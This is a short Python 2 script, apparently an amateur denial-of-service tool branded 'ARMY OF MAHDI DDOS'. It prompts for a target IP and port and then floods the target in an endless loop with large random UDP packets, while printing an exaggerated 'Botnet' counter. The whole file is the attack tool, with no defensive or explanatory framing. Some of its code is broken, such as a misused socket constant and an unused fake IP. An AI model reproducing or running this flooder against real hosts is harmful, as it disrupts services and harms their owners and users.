import sys
import os
import time
import socket
import random
if os.name == "posix":
    os.system('clear')
if os.name == "nt":
    os.system('cls')
print("TEAM : EIHT")
print("ARMY OF MAHDI DDOS")
print("Made By MrSanZz")
ip = raw_input("IP : ")
port = input("Port : ")
try:
    fakeip = '192.165.4.4'
    soc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(65000)
    soc2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes2 = random._urandom(65000)
    soc3 = socket.socket(socket.AF_INET, socket.TCP_NODELAY)
    bytes3 = random._urandom(65000)
    sent = 5000
    if os.name == "posix":
        os.system('clear')
    if os.name == "nt":
        os.system('cls')
    print("\033[1;3mWait Bro.. The Satellite Cannon Is RECHARGE..")
    time.sleep(5)
    while True:
        soc.sendto(bytes, (ip,port))
        soc2.sendto(bytes2, (ip,port))
        soc3.sendto(bytes3, (ip,port))
        sent = sent + 500
        print "\033[1;34mSending \033[1;33m%s \033[1;34mBotnet To \033[1;33m%s \033[1;34mPort \033[1;33m%s"%(sent,ip,port)
except KeyboardInterrupt:
    print("Keyboard Interrupt")
    exit()
